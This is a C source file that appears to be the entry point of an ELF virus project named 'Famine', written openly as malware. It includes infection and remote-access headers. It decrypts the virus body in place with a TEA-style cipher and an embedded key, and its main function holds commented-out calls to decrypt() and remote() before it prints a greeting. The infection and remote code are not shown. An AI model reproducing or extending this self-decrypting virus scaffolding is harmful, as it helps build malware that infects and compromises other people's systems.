#include "lib/lib.h"
#include "lib/remote.h"
#include "lib/infect.h"
#include "virus_pos.h"

int __attribute__((section (".textearly"))) main(int ac, char **av) asm ("entry");
void __attribute__((section (".textearly"))) decrypt();


extern size_t virus_addr;
extern size_t virus_length;

//======================= WOODY ==============================

extern size_t crypt_off;
extern size_t crypt_length;

extern char   key[16];

#include <elf.h>

/*
void decrypt_block(uint32_t* v, uint32_t *k) {
	uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; 
	uint32_t delta=0x9e3779b9;                     
	uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   
	for (i=0; i<32; i++) {                         
		v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
		v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
		sum -= delta;
	}
	v[0]=v0; v[1]=v1;
}
*/

extern void decrypt_block_asm(uint32_t *v, uint32_t *k);

void decrypt(){
	char *s = ((char*)virus_addr) + crypt_off;
	uint64_t n = crypt_length;

	for (uint64_t i = 0; i < n; i += 8){
		if (i + 7 <= n){
			decrypt_block_asm((uint32_t*)(s+i), (uint32_t*)key);
		}
	}
}

//=============================================================

int main(int ac, char **av){
	//CALL ANY FUNCTIONS HERE IT WILL SEGV
	//println("Hello, I am Famine");
	//decrypt();
	//remote();
	println("Hello, I am Famine X");
}
